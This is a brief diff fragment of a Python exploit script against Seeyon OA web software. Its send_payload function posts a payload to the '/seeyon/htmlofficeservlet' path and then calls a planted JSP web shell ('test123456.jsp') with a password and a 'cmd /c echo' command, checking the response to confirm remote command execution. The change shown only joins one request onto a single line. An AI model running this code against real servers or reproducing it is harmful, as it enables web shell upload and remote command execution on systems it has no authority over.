@@ -22,8 +22,7 @@ def send_payload(url):
  
         r = requests.post(url + '/seeyon/htmlofficeservlet', data=payload1)
  
-        r = requests.get(
-            url + '/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+echo+wangming')
+        r = requests.get(url + '/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+echo+wangming')
  
         if "wangming" in r.text:
  
